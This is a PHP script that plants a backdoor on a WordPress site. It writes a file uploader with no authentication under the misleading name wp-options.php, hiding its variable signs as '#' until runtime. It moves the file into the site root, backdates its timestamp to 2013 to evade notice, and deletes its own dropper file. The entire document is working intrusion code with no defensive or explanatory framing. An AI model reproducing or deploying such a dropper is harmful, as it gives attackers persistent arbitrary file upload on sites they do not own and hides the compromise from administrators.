<?php

$DEBUG_MODE=false;

// Creating wp-admin/wp-options.php (uploader)

$file_data_head ="<?php
if(isset(#_POST['Submit'])){
    #filedir = '';
    #maxfile = '2888888';
 
    #userfile_name = #_FILES['image']['name'];
    #userfile_tmp = #_FILES['image']['tmp_name'];
    if (isset(#_FILES['image']['name'])) {
        #abod = #filedir.#userfile_name;
        @move_uploaded_file(#userfile_tmp, #abod);

}
}
else{
echo'<form method=\"POST\" action=\"\" enctype=\"multipart/form-data\"><input type=\"file\" name=\"image\"><input type=\"Submit\" name=\"Submit\" value=\"Submit\"></form>';
}
?>";

echo"<br>---------------------------- Create wp-admin/wp-options.php (uploader) ---------------------------------<br><br>";
if (file_put_contents("wp-optionstmp.php", str_replace("#", "$", $file_data_head))) {
touch("wp-optionstmp.php", mktime(12, 17, 11, 12, 31, 2013));
	echo"Proceeded: ".$start."/wp-admin/wp-options.php > Succesfull<br>";
} else {
	echo"Proceeded: ".$start."/wp-admin/wp-options.php > Error!<br>";
}

$file = 'wp-optionstmp.php';
$newfile = '../wp-options.php';

echo"<br>---------------------------- Move wp-admin/wp-options.php > To root folder ---------------------------------<br><br>";
if (rename($file,$newfile)) {
touch("../wp-options.php", mktime(12, 17, 11, 12, 31, 2013));
	echo"Proceeded: ".$start."/wp-options.php > Succesfull<br>";
} else {
	echo"Proceeded: ".$start."/wp-options.php > Error!<br>";
}

$file='frommshead.php';

echo"<br>---------------------------- Remove frommshead.php (Remove files) ---------------------------------<br><br>";
touch("frommshead.php", mktime(12, 17, 11, 12, 31, 2013));
unlink($file);